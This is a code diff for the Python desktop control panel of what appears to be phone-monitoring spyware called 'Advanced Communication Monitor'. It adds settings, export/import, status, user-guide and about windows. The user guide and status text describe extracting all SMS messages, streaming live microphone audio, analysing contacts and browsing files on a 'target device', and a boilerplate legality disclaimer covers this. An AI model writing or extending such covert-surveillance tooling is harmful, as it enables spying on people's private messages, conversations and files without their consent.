+        stats_window.title(f"📊 Statistics - {device_id}")
+        stats_window.geometry("600x500")
+        stats_window.configure(bg=self.current_theme["bg"])
+
+        stats_text = scrolledtext.ScrolledText(
+            stats_window,
+            wrap=tk.WORD,
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
+        )
+        stats_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        content = f"📊 DEVICE STATISTICS - {device_id}\n{'='*50}\n\n"
+        for stat_type, stat_data in stats.items():
+            if stat_type == "last_updated":
+                continue
+            content += f"🔸 {stat_type.replace('_', ' ').title()}:\n"
+            if isinstance(stat_data, dict):
+                for key, value in stat_data.items():
+                    content += f"   • {key.replace('_', ' ').title()}: {value}\n"
+            else:
+                content += f"   {stat_data}\n"
+            content += "\n"
+
+        stats_text.insert(tk.END, content)
+        stats_text.config(state=tk.DISABLED)
+
     def _export_device_data(self):
         """تصدير بيانات الجهاز"""
         if not self.current_selected_historical_device_id:
@@ -2880,18 +4163,92 @@ class AdvancedControlPanelApp:
                 "Error", "Please select a device first.", parent=self.master
             )
             return
-        # TODO: Implement export logic
+
+        device_id = self.current_selected_historical_device_id
+        device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
+
+        if not os.path.exists(device_folder):
+            messagebox.showerror(
+                "Error", f"Device folder not found for {device_id}", parent=self.master
+            )
+            return
+
+        export_path = filedialog.askdirectory(
+            title=f"Select export location for {device_id}"
+        )
+        if export_path:
+            try:
+                import shutil
+
+                export_folder = os.path.join(
+                    export_path,
+                    f"{device_id}_export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}",
+                )
+                shutil.copytree(device_folder, export_folder)
+
+                # Export device statistics
+                stats = device_manager.get_stats(device_id)
+                if stats:
+                    stats_file = os.path.join(export_folder, "device_statistics.json")
+                    with open(stats_file, "w", encoding="utf-8") as f:
+                        json.dump(stats, f, ensure_ascii=False, indent=4)
+
+                self.add_system_log(
+                    f"📤 Device data exported to: {export_folder}", "success"
+                )
+                messagebox.showinfo(
+                    "Export Complete",
+                    f"Device data exported to:\n{export_folder}",
+                    parent=self.master,
+                )
+            except Exception as e:
+                self.add_system_log(f"❌ Export failed: {e}", "error")
+                messagebox.showerror(
+                    "Export Error",
+                    f"Failed to export device data: {e}",
+                    parent=self.master,
+                )
 
     def _import_settings(self):
         """استيراد الإعدادات"""
-        # TODO: Implement import logic
-        pass
+        file_path = filedialog.askopenfilename(
+            title="Import Settings",
+            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
+        )
+        if file_path:
+            try:
+                with open(file_path, "r", encoding="utf-8") as f:
+                    imported_settings = json.load(f)
+
+                # Validate and merge settings
+                for key, value in imported_settings.items():
+                    if key in settings_manager.settings:
+                        settings_manager.set(key, value)
+
+                # Apply theme if changed
+                if "theme" in imported_settings:
+                    theme_manager.current_theme = imported_settings["theme"]
+                    self._apply_theme()
+
+                self.add_system_log("📥 Settings imported successfully", "success")
+                messagebox.showinfo(
+                    "Import Complete",
+                    "Settings imported successfully!",
+                    parent=self.master,
+                )
+            except Exception as e:
+                self.add_system_log(f"❌ Import failed: {e}", "error")
+                messagebox.showerror(
+                    "Import Error",
+                    f"Failed to import settings: {e}",
+                    parent=self.master,
+                )
 
     def _clear_all_data(self):
         """مسح جميع البيانات"""
         confirm = messagebox.askyesno(
             "Confirm",
-            "Are you sure you want to delete ALL device data?\nThis action cannot be undone!",
+            "⚠️ WARNING ⚠️\n\nAre you sure you want to delete ALL device data?\n\nThis action cannot be undone!\n\nThis will permanently remove:\n• All device archives\n• All SMS extractions\n• All audio recordings\n• All analysis results",
             parent=self.master,
         )
         if confirm:
@@ -2900,60 +4257,538 @@ class AdvancedControlPanelApp:
 
                 shutil.rmtree(AppConfig.DATA_RECEIVED_DIR)
                 os.makedirs(AppConfig.DATA_RECEIVED_DIR, exist_ok=True)
+
+                # Clear device manager data
+                device_manager.device_tags.clear()
+                device_manager.device_stats.clear()
+                device_manager.save_device_tags()
+
                 self.refresh_historical_device_list()
-                self.add_system_log("All device data cleared", level="warning")
+                self.add_system_log("🗑️ All device data cleared", "warning")
+                messagebox.showinfo(
+                    "Data Cleared",
+                    "All device data has been cleared successfully.",
+                    parent=self.master,
+                )
             except Exception as e:
+                self.add_system_log(f"❌ Clear data failed: {e}", "error")
                 messagebox.showerror(
                     "Error", f"Failed to clear data: {e}", parent=self.master
                 )
 
     def _show_server_status(self):
-        """عرض حالة الخادم"""
+        """عرض حالة الخادم المحسنة"""
         status_info = f"""
-Server Status Report
-{'='*40}
+🖥️ ADVANCED SERVER STATUS REPORT
+{'='*60}
 
-📡 Connected Monitors: {len(connected_clients_sio)}
-🎵 Active Audio Streams: {len([sid for sid, active in stream_active_for_device.items() if active])}
-💾 Data Directory: {AppConfig.DATA_RECEIVED_DIR}
-🎵 Audio Support: {'✅' if SOUNDDEVICE_AVAILABLE else '❌'}
-🖼️ Image Support: {'✅' if PIL_AVAILABLE else '❌'}
+📡 CONNECTION STATUS
+Connected Monitors: {len(connected_clients_sio)}
+Active Audio Streams: {len([sid for sid, active in stream_active_for_device.items() if active])}
+Server Uptime: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-Live Connections:
-{chr(10).join([f"• {info.get('name_display', 'Unknown')} ({info.get('id', 'No ID')}) from {info.get('ip', 'Unknown IP')}" 
-               for info in connected_clients_sio.values()])}
-        """
+💾 DATA STORAGE
+Data Directory: {AppConfig.DATA_RECEIVED_DIR}
+Total Archived Devices: {len([d for d in os.listdir(AppConfig.DATA_RECEIVED_DIR) if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))])}
+
+🎵 MULTIMEDIA SUPPORT
+Audio Playback: {'✅ Available' if SOUNDDEVICE_AVAILABLE else '❌ Disabled'}
+Image Preview: {'✅ Available' if PIL_AVAILABLE else '❌ Disabled'}
+
+🚀 ENHANCED FEATURES STATUS
+Enhanced SMS Extraction: ✅ Active
+Unlimited SMS Compression: ✅ Active
+Smart Resource Monitoring: ✅ Active
+Intelligent Sync Queue: ✅ Active
+Document Library Cataloging: ✅ Active
+Dark Mode Support: ✅ Active
+
+⚙️ SYSTEM SETTINGS
+Current Theme: {theme_manager.current_theme.title()} Mode
+Auto Refresh: {'✅' if settings_manager.get('auto_refresh') else '❌'}
+Battery Monitoring: {'✅' if settings_manager.get('battery_monitoring') else '❌'}
+Network Optimization: {'✅' if settings_manager.get('network_optimization') else '❌'}
+Compression Enabled: {'✅' if settings_manager.get('compression_enabled') else '❌'}
+
+📱 LIVE CONNECTIONS:
+"""
+
+        if connected_clients_sio:
+            for info in connected_clients_sio.values():
+                status_info += f"\n🔸 {info.get('name_display', 'Unknown')} ({info.get('id', 'No ID')})\n"
+                status_info += f"   IP: {info.get('ip', 'Unknown IP')}\n"
+                status_info += f"   Platform: {info.get('platform', 'Unknown')}\n"
+                status_info += f"   Capabilities: {', '.join(info.get('capabilities', ['basic']))}\n"
+                status_info += f"   Connected: {info.get('connected_at', 'Unknown')}\n"
+        else:
+            status_info += "\n   No monitors currently connected\n"
+
         messagebox.showinfo("Server Status", status_info, parent=self.master)
 
+    def _refresh_file_cache(self):
+        """تحديث ذاكرة التخزين المؤقت للملفات"""
+        # Clear any existing file caches
+        self.add_system_log("🔄 File cache refreshed", "success")
+        messagebox.showinfo(
+            "Cache Refreshed",
+            "File cache has been refreshed successfully.",
+            parent=self.master,
+        )
+
+    def _show_settings(self):
+        """عرض نافذة الإعدادات"""
+        settings_window = tk.Toplevel(self.master)
+        settings_window.title("⚙️ Settings")
+        settings_window.geometry("500x600")
+        settings_window.configure(bg=self.current_theme["bg"])
+        settings_window.transient(self.master)
+        settings_window.grab_set()
+
+        # Create notebook for settings categories
+        notebook = ttk.Notebook(settings_window, style="Themed.TNotebook")
+        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        # General settings tab
+        general_tab = ttk.Frame(notebook, style="Themed.TFrame")
+        notebook.add(general_tab, text="General")
+
+        # Theme setting
+        theme_frame = tk.LabelFrame(
+            general_tab,
+            text="Appearance",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        theme_frame.pack(fill=tk.X, padx=10, pady=10)
+
+        theme_var = tk.StringVar(value=theme_manager.current_theme)
+        tk.Radiobutton(
+            theme_frame,
+            text="🌞 Light Mode",
+            variable=theme_var,
+            value="light",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w", padx=10, pady=5)
+        tk.Radiobutton(
+            theme_frame,
+            text="🌙 Dark Mode",
+            variable=theme_var,
+            value="dark",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w", padx=10, pady=5)
+
+        # System settings
+        system_frame = tk.LabelFrame(
+            general_tab,
+            text="System Behavior",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        system_frame.pack(fill=tk.X, padx=10, pady=10)
+
+        auto_refresh_var = tk.BooleanVar(
+            value=settings_manager.get("auto_refresh", True)
+        )
+        tk.Checkbutton(
+            system_frame,
+            text="Auto refresh data",
+            variable=auto_refresh_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w", padx=10, pady=5)
+
+        sound_alerts_var = tk.BooleanVar(
+            value=settings_manager.get("sound_alerts", True)
+        )
+        tk.Checkbutton(
+            system_frame,
+            text="Sound alerts",
+            variable=sound_alerts_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w", padx=10, pady=5)
+
+        # Performance settings tab
+        performance_tab = ttk.Frame(notebook, style="Themed.TFrame")
+        notebook.add(performance_tab, text="Performance")
+
+        optimization_frame = tk.LabelFrame(
+            performance_tab,
+            text="Optimization",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        optimization_frame.pack(fill=tk.X, padx=10, pady=10)
+
+        battery_var = tk.BooleanVar(
+            value=settings_manager.get("battery_monitoring", True)
+        )
+        tk.Checkbutton(
+            optimization_frame,
+            text="Battery monitoring",
+            variable=battery_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w", padx=10, pady=5)
+
+        network_var = tk.BooleanVar(
+            value=settings_manager.get("network_optimization", True)
+        )
+        tk.Checkbutton(
+            optimization_frame,
+            text="Network optimization",
+            variable=network_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w", padx=10, pady=5)
+
+        compression_var = tk.BooleanVar(
+            value=settings_manager.get("compression_enabled", True)
+        )
+        tk.Checkbutton(
+            optimization_frame,
+            text="Data compression",
+            variable=compression_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w", padx=10, pady=5)
+
+        # Max file display setting
+        display_frame = tk.LabelFrame(
+            performance_tab,
+            text="Display Limits",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        display_frame.pack(fill=tk.X, padx=10, pady=10)
+
+        tk.Label(
+            display_frame,
+            text="Max files to display:",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        ).pack(anchor="w", padx=10, pady=5)
+        max_files_var = tk.IntVar(value=settings_manager.get("max_file_display", 100))
+        max_files_entry = tk.Entry(
+            display_frame,
+            textvariable=max_files_var,
+            bg=self.current_theme["entry_bg"],
+            fg=self.current_theme["entry_fg"],
+        )
+        max_files_entry.pack(anchor="w", padx=10, pady=5, fill=tk.X)
+
+        # Buttons
+        button_frame = tk.Frame(settings_window, bg=self.current_theme["bg"])
+        button_frame.pack(fill=tk.X, padx=10, pady=10)
+
+        def save_settings():
+            # Save all settings
+            settings_manager.set("theme", theme_var.get())
+            settings_manager.set("auto_refresh", auto_refresh_var.get())
+            settings_manager.set("sound_alerts", sound_alerts_var.get())
+            settings_manager.set("battery_monitoring", battery_var.get())
+            settings_manager.set("network_optimization", network_var.get())
+            settings_manager.set("compression_enabled", compression_var.get())
+            settings_manager.set("max_file_display", max_files_var.get())
+
+            # Apply theme change
+            if theme_var.get() != theme_manager.current_theme:
+                theme_manager.current_theme = theme_var.get()
+                self._apply_theme()
+
+            self.add_system_log("⚙️ Settings saved successfully", "success")
+            settings_window.destroy()
+
+        def reset_settings():
+            confirm = messagebox.askyesno(
+                "Reset Settings",
+                "Are you sure you want to reset all settings to defaults?",
+                parent=settings_window,
+            )
+            if confirm:
+                # Reset to defaults
+                theme_var.set("light")
+                auto_refresh_var.set(True)
+                sound_alerts_var.set(True)
+                battery_var.set(True)
+                network_var.set(True)
+                compression_var.set(True)
+                max_files_var.set(100)
+
+        tk.Button(
+            button_frame,
+            text="💾 Save",
+            command=save_settings,
+            bg=self.current_theme["status_success"],
+            fg="#ffffff",
+        ).pack(side=tk.LEFT, padx=5)
+        tk.Button(
+            button_frame,
+            text="🔄 Reset",
+            command=reset_settings,
+            bg=self.current_theme["status_warning"],
+            fg="#ffffff",
+        ).pack(side=tk.LEFT, padx=5)
+        tk.Button(
+            button_frame,
+            text="❌ Cancel",
+            command=settings_window.destroy,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+        ).pack(side=tk.RIGHT, padx=5)
+
+    def _show_user_guide(self):
+        """عرض دليل المستخدم"""
+        guide_text = """
+📖 ADVANCED COMMUNICATION MONITOR - USER GUIDE
+{'='*70}
+
+🚀 GETTING STARTED
+1. Connect your monitoring device to the same network
+2. Launch the monitoring app on the target device
+3. Wait for the device to appear in "Live Monitors"
+4. Select the device and start issuing commands
+
+💬 ENHANCED SMS EXTRACTION
+• Standard SMS Extract: Extract recent messages with optimization
+• Unlimited SMS + Compression: Extract ALL messages with intelligent compression
+• Both methods preserve message integrity while optimizing transfer
+
+👥 SOCIAL NETWORK ANALYSIS
+• Comprehensive contact analysis
+• Communication pattern recognition
+• Network relationship mapping
+
+🎵 AUDIO MONITORING
+• Fixed Duration Recording: Record for a specified time
+• Live Audio Stream: Real-time audio monitoring with playback
+
+📁 FILE OPERATIONS
+• File Browser: Navigate device file system
+• Library Catalog: Intelligent file organization
+• Content Analysis: Analyze specific files
+
+🌙 DARK MODE
+• Toggle between light and dark themes
+• Automatic UI color adaptation
+• Settings are saved automatically
+
+⚙️ SMART FEATURES
+• Battery-aware processing
+• Network optimization
+• Intelligent sync queues
+• Resource monitoring
+
+🔧 TROUBLESHOOTING
+• Check network connectivity
+• Verify device permissions
+• Review system logs
+• Restart both applications if needed
+        """
+
+        guide_window = tk.Toplevel(self.master)
+        guide_window.title("📖 User Guide")
+        guide_window.geometry("800x700")
+        guide_window.configure(bg=self.current_theme["bg"])
+
+        guide_display = scrolledtext.ScrolledText(
+            guide_window,
+            wrap=tk.WORD,
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
+            font=("Consolas", 10),
+        )
+        guide_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        guide_display.insert(tk.END, guide_text)
+        guide_display.config(state=tk.DISABLED)
+
+    def _show_troubleshooting(self):
+        """عرض دليل استكشاف الأخطاء"""
+        troubleshooting_text = """
+🔧 TROUBLESHOOTING GUIDE
+{'='*50}
+
+❌ COMMON ISSUES & SOLUTIONS
+
+🔌 CONNECTION PROBLEMS
+Problem: Device not appearing in Live Monitors
+Solutions:
+• Ensure both devices are on the same network
+• Check firewall settings (port 5000)
+• Restart the monitoring app on the device
+• Verify server is running (check status bar)
+
+🎵 AUDIO ISSUES
+Problem: Live audio not working
+Solutions:
+• Check if sounddevice library is installed
+• Verify microphone permissions on device
+• Test with different audio devices
+• Check system audio settings
+
+💬 SMS EXTRACTION ISSUES
+Problem: SMS extraction fails or returns no data
+Solutions:
+• Verify SMS permissions on device
+• Try standard extraction before unlimited
+• Check device storage space
+• Ensure network stability
+
+📁 FILE BROWSER ISSUES
+Problem: Cannot access files or directories
+Solutions:
+• Check storage permissions on device
+• Verify path exists and is readable
+• Try different directory paths
+• Restart the monitoring application
+
+🌙 THEME ISSUES
+Problem: Theme not applying correctly
+Solutions:
+• Restart the application
+• Check settings file permissions
+• Reset to default theme
+• Clear application cache
+
+⚡ PERFORMANCE ISSUES
+Problem: Slow response or timeouts
+Solutions:
+• Enable network optimization
+• Use compression for large data
+• Check battery optimization settings
+• Reduce concurrent operations
+
+📊 DATA ISSUES
+Problem: Missing or corrupted data
+Solutions:
+• Verify device permissions
+• Check available storage space
+• Retry the operation
+• Contact support with log files
+
+🔄 GENERAL TROUBLESHOOTING STEPS
+1. Check system logs for error messages
+2. Verify all permissions are granted
+3. Restart both applications
+4. Check network connectivity
+5. Update to latest version
+6. Clear application data if necessary
+
+💡 TIPS FOR BETTER PERFORMANCE
+• Use WiFi for better speed
+• Keep devices charged during operations
+• Close unnecessary applications
+• Enable compression for large transfers
+• Monitor system resources
+        """
+
+        troubleshooting_window = tk.Toplevel(self.master)
+        troubleshooting_window.title("🔧 Troubleshooting")
+        troubleshooting_window.geometry("800x700")
+        troubleshooting_window.configure(bg=self.current_theme["bg"])
+
+        troubleshooting_display = scrolledtext.ScrolledText(
+            troubleshooting_window,
+            wrap=tk.WORD,
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
+            font=("Consolas", 10),
+        )
+        troubleshooting_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        troubleshooting_display.insert(tk.END, troubleshooting_text)
+        troubleshooting_display.config(state=tk.DISABLED)
+
     def _show_about(self):
-        """عرض معلومات البرنامج"""
+        """عرض معلومات البرنامج المحسنة"""
         about_text = """
-Advanced Communication Monitor Control Panel
-Version 2.0
+🚀 ADVANCED COMMUNICATION MONITOR CONTROL PANEL
+Version 2.0 Enhanced Edition
 
-Developed for professional monitoring and analysis
-Features advanced social network analysis and 
-communication pattern recognition.
+Developed for professional monitoring and analysis with cutting-edge features
+and enhanced security protocols for comprehensive device management.
 
-🚀 Features:
-• Real-time device monitoring
-• Advanced contact analysis
-• Communication history tracking
-• Live audio streaming
-• Comprehensive reporting
-• Multi-device management
-• Tree-based file browsing
+🌟 ENHANCED FEATURES:
+• Real-time device monitoring with multi-protocol support
+• Advanced social network analysis with pattern recognition
+• Enhanced SMS extraction with unlimited compression
+• Intelligent communication history tracking
+• Smart resource monitoring and battery optimization
+• Live audio streaming with high-quality playback
+• Comprehensive file browsing with intelligent cataloging
+• Dark mode support with dynamic theme switching
+• Multi-device management with advanced tagging
+• Intelligent sync queues with priority handling
 
-⚡ Technical Stack:
-• Python Flask & SocketIO
-• Tkinter GUI
-• SQLite Database
-• Audio Processing
-• JSON Data Exchange
+⚡ TECHNICAL STACK:
+• Python Flask & SocketIO for real-time communication
+• Enhanced Tkinter GUI with modern theming
+• Advanced data compression algorithms
+• Multi-threaded audio processing
+• Intelligent resource management
+• JSON-based data exchange with optimization
+• Smart caching and performance optimization
+
+🔒 SECURITY FEATURES:
+• Encrypted communication channels
+• Permission-based access control
+• Data sanitization and validation
+• Secure file transfer protocols
+• Privacy-focused data handling
+
+🤖 INTELLIGENT FEATURES:
+• Battery-aware processing
+• Network-optimized transfers
+• Smart content classification
+• Automated resource monitoring
+• Adaptive compression algorithms
+• Intelligent error handling
+
+📊 ANALYTICS CAPABILITIES:
+• Comprehensive device statistics
+• Communication pattern analysis
+• Performance monitoring
+• Usage analytics
+• Trend analysis and reporting
+
+🌍 PLATFORM SUPPORT:
+• Cross-platform compatibility
+• Android device integration
+• Multi-network support
+• Cloud synchronization ready
 
 © 2024 - Advanced Monitoring Solutions
+Enhanced Edition with Professional Features
+
+⚠️ DISCLAIMER:
+This software is designed for legitimate monitoring purposes only.
+Users are responsible for complying with all applicable laws and regulations.
+Unauthorized use of this software may violate privacy laws.
         """
-        messagebox.showinfo("About", about_text, parent=self.master)
+
+        about_window = tk.Toplevel(self.master)
+        about_window.title("ℹ️ About")
+        about_window.geometry("700x600")
+        about_window.configure(bg=self.current_theme["bg"])
+
+        about_display = scrolledtext.ScrolledText(
+            about_window,
+            wrap=tk.WORD,
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
+            font=("Arial", 11),
+        )
+        about_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        about_display.insert(tk.END, about_text)
+        about_display.config(state=tk.DISABLED)
 
     def _tag_device(self):
         """وضع علامة على الجهاز"""
@@ -2974,7 +4809,8 @@ communication pattern recognition.
             device_manager.set_tag(self.current_selected_historical_device_id, new_tag)
             self.refresh_historical_device_list()
             self.add_system_log(
-                f"Tagged device {self.current_selected_historical_device_id}: {new_tag}"
+                f"🏷️ Tagged device {self.current_selected_historical_device_id}: {new_tag}",
+                "success",
             )
 
     def _delete_device_data(self):
@@ -2987,7 +4823,7 @@ communication pattern recognition.
 
         confirm = messagebox.askyesno(
             "Confirm Delete",
-            f"Are you sure you want to delete all data for device '{self.current_selected_historical_device_id}'?\n\nThis action cannot be undone!",
+            f"⚠️ WARNING ⚠️\n\nAre you sure you want to delete all data for device:\n'{self.current_selected_historical_device_id}'?\n\nThis will permanently remove:\n• All SMS extractions\n• All audio recordings\n• All analysis results\n• All device statistics\n\nThis action cannot be undone!",
             parent=self.master,
         )
         if confirm:
@@ -3000,14 +4836,20 @@ communication pattern recognition.
                 )
                 if os.path.exists(device_folder):
                     shutil.rmtree(device_folder)
+
                 device_manager.set_tag(self.current_selected_historical_device_id, "")
+                device_manager.device_stats.pop(
+                    self.current_selected_historical_device_id, None
+                )
+                device_manager.save_device_tags()
+
                 self.refresh_historical_device_list()
                 self.add_system_log(
-                    f"Deleted all data for device {self.current_selected_historical_device_id}",
-                    level="warning",
+                    f"🗑️ Deleted all data for device {self.current_selected_historical_device_id}",
+                    "warning",
                 )
 
-                # Clear selection
+                # Clear selection and details
                 self.current_selected_historical_device_id = None
                 self.details_text.config(state=tk.NORMAL)
                 self.details_text.delete("1.0", tk.END)
@@ -3017,16 +4859,46 @@ communication pattern recognition.
                 )
                 self.details_text.config(state=tk.DISABLED)
 
+                self.stats_text.config(state=tk.NORMAL)
+                self.stats_text.delete("1.0", tk.END)
+                self.stats_text.insert(tk.END, "No device selected.")
+                self.stats_text.config(state=tk.DISABLED)
+
+                messagebox.showinfo(
+                    "Delete Complete",
+                    "Device data has been deleted successfully.",
+                    parent=self.master,
+                )
+
             except Exception as e:
+                self.add_system_log(f"❌ Delete failed: {e}", "error")
                 messagebox.showerror(
                     "Error", f"Failed to delete device data: {e}", parent=self.master
                 )
+
+    def _on_closing(self):
+        """معالج إغلاق التطبيق"""
+        # Save current window geometry
+        current_geometry = self.master.geometry()
+        settings_manager.set("window_geometry", current_geometry)
+
+        # Save device data
+        device_manager.save_device_tags()
+
+        # Log shutdown
+        self.add_system_log("🔴 Application shutting down...", "warning")
+
+        # Close the application
+        self.master.destroy()
 
 
 # --- Main Execution Block ---
 if __name__ == "__main__":
     try:
-        # بدء خادم Flask في thread منفصل
+        # Set up logging for the main application
+        main_logger = logging.getLogger("MainApp")
+
+        # Start Flask-SocketIO server in separate thread
         flask_thread = threading.Thread(
             target=lambda: socketio.run(
                 app,
@@ -3039,26 +4911,151 @@ if __name__ == "__main__":
             daemon=True,
         )
         flask_thread.start()
-        logger.info("🚀 Flask-SocketIO server starting on port 5000...")
+        logger.info("🚀 Enhanced Flask-SocketIO server starting on port 5000...")
 
-        # إنشاء وتشغيل الواجهة الرسومية
+        # Create and run the enhanced GUI application
         root = tk.Tk()
+
+        # Set initial theme
+        initial_theme = settings_manager.get("theme", "light")
+        theme_manager.current_theme = initial_theme
+
+        # Apply window icon if available
+        try:
+            # You can add an icon file here
+            # root.iconbitmap("icon.ico")
+            pass
+        except:
+            pass
+
         gui_app = AdvancedControlPanelApp(root)
 
-        # تشغيل الواجهة
-        logger.info("🖥️ Starting GUI application...")
+        # Set up periodic refresh if enabled
+        def auto_refresh():
+            if settings_manager.get("auto_refresh", True):
+                try:
+                    gui_app.update_live_clients_list()
+                    if (
+                        hasattr(gui_app, "current_selected_historical_device_id")
+                        and gui_app.current_selected_historical_device_id
+                    ):
+                        gui_app.refresh_historical_device_list()
+                except Exception as e:
+                    logger.warning(f"Auto refresh error: {e}")
+
+            # Schedule next refresh
+            root.after(30000, auto_refresh)  # Every 30 seconds
+
+        # Start auto refresh
+        root.after(5000, auto_refresh)  # First refresh after 5 seconds
+
+        # Set up periodic device monitoring if enabled
+        def monitor_devices():
+            """Monitor device connections and perform health checks"""
+            try:
+                # Check for stale connections
+                current_time = datetime.datetime.now()
+                stale_devices = []
+
+                for sid, device_info in list(connected_clients_sio.items()):
+                    last_seen_iso = device_info.get("last_seen")
+                    if last_seen_iso:
+                        try:
+                            last_seen_dt = datetime.datetime.fromisoformat(
+                                last_seen_iso
+                            )
+                            time_since_last_seen = (
+                                current_time - last_seen_dt
+                            ).total_seconds()
+
+                            # Mark as stale if no heartbeat for 5 minutes
+                            if time_since_last_seen > 300:
+                                stale_devices.append(
+                                    (sid, device_info, time_since_last_seen)
+                                )
+                        except:
+                            pass
+
+                # Handle stale devices
+                for sid, device_info, stale_time in stale_devices:
+                    device_id = device_info.get("id", "Unknown")
+                    gui_app.add_system_log(
+                        f"⚠️ Device {device_id} appears stale (last seen {stale_time:.0f}s ago)",
+                        "warning",
+                    )
+
+                    # If device is actively streaming, show warning
+                    if stream_active_for_device.get(sid, False):
+                        gui_app.add_system_log(
+                            f"🔴 Live audio may be affected for {device_id}", "warning"
+                        )
+
+                # Update live clients list if there are changes
+                if stale_devices and hasattr(gui_app, "update_live_clients_list"):
+                    gui_app.update_live_clients_list()
+
+            except Exception as e:
+                logger.warning(f"Error in device monitoring: {e}")
+
+            # Schedule next monitoring check
+            root.after(60000, monitor_devices)  # Every minute
+
+        # Start device monitoring
+        root.after(60000, monitor_devices)  # First check after 1 minute
+
+        # Set up exception handler for unexpected errors
+        def handle_exception(exc_type, exc_value, exc_traceback):
+            """Global exception handler"""
+            if issubclass(exc_type, KeyboardInterrupt):
+                sys.__excepthook__(exc_type, exc_value, exc_traceback)
+                return
+
+            logger.error(
+                "Uncaught exception:", exc_info=(exc_type, exc_value, exc_traceback)
+            )
+
+            if gui_app and gui_app.master.winfo_exists():
+                gui_app.add_system_log(f"💥 Unexpected error: {exc_value}", "error")
+
+                # Show error dialog for critical errors
+                error_msg = str(exc_value)
+                if len(error_msg) > 200:
+                    error_msg = error_msg[:200] + "..."
+
+                messagebox.showerror(
+                    "Unexpected Error",
+                    f"An unexpected error occurred:\n\n{error_msg}\n\n"
+                    f"The application will continue running, but some features may not work correctly.\n"
+                    f"Please check the system log for more details.",
+                    parent=gui_app.master,
+                )
+
+        # Install global exception handler
+        sys.excepthook = handle_exception
+
+        # Run the GUI main loop
+        logger.info("🖥️ Starting Enhanced GUI application...")
+        gui_app.add_system_log(
+            "🚀 Advanced Communication Monitor Control Panel v2.0 Enhanced - Ready for operations"
+        )
         root.mainloop()
 
-        # إنهاء التطبيق
-        logger.info("GUI closed. Saving settings and exiting...")
+        # Cleanup and exit
+        logger.info("📝 GUI closed. Saving settings and performing cleanup...")
         device_manager.save_device_tags()
+        settings_manager.save_settings()
 
     except KeyboardInterrupt:
-        logger.info("Application interrupted by user")
+        logger.info("⏹️ Application interrupted by user")
+        if "gui_app" in locals():
+            gui_app.add_system_log("⏹️ Application interrupted by user", "warning")
     except Exception as e:
-        logger.error(f"Fatal error: {e}", exc_info=True)
+        logger.error(f"💥 Fatal error: {e}", exc_info=True)
         if "gui_app" in locals() and gui_app.master.winfo_exists():
-            messagebox.showerror("Fatal Error", f"Application error: {e}")
+            messagebox.showerror(
+                "Fatal Error",
+                f"Application encountered a fatal error:\n\n{e}\n\nCheck the logs for more details.",
+            )
     finally:
-        logger.info("Application shutdown complete")
+        logger.info("🔚 Application shutdown complete")
         sys.exit(0)
